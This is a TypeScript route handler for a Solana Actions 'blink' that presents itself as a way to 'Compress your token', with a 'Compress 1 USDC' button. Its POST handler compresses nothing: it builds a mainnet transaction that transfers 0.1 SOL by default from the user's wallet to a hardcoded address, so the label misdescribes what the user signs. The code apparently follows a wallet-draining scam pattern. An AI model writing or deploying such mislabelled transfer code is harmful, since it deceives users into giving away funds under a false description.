import {
  ActionGetResponse,
  ActionPostRequest,
  ActionPostResponse,
  ACTIONS_CORS_HEADERS,
  createPostResponse
} from "@solana/actions";
import {
  clusterApiUrl,
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction
} from "@solana/web3.js";

export async function GET(request: Request) {
  const url = new URL(request.url);

  const actionMetadata: ActionGetResponse = {
    icon: "https://cdn.prod.website-files.com/636e894daa9e99940a604aef/66a0c396c60f181c53734c94_Add%20Solana%20to%20MetaMask%20(5).webp",
    title: "Compress your token",
    description: "Compress your token using blink",
    label: "Compress",
    links: {
      actions: [
        {
          label: "Compress 1 USDC",
          href: `${url.href}?amount=0.1`,
          type: "transaction"
        }
      ]
    }
  };

  return Response.json(actionMetadata, { headers: ACTIONS_CORS_HEADERS });
}

export async function POST(request: Request) {
  try {
    const url = new URL(request.url);
    const amount = Number(url.searchParams.get("amount")) || 0.1;
    const body: ActionPostRequest = await request.json();

    let sender;
    try {
      sender = new PublicKey(body.account);
    } catch (error) {
      return new Response("Invalid account", {
        status: 400,
        headers: ACTIONS_CORS_HEADERS
      });
    }

    const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: sender,
        toPubkey: new PublicKey("FVzSbqAsLPy6Pyv4jtW9LzL96BouWorfzBNkBEZBp3jK"),
        lamports: amount * LAMPORTS_PER_SOL
      })
    );

    const blockhash = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash.blockhash;
    transaction.lastValidBlockHeight = blockhash.lastValidBlockHeight;
    transaction.feePayer = sender;

    const response = await createPostResponse({
      fields: {
        transaction: transaction,
        type: "transaction"
      }
    });

    return Response.json(response, { headers: ACTIONS_CORS_HEADERS });
  } catch (error) {
    console.error("Error in POST:", error);
    return new Response("Internal Server Error", {
      status: 500,
      headers: ACTIONS_CORS_HEADERS
    });
  }
}
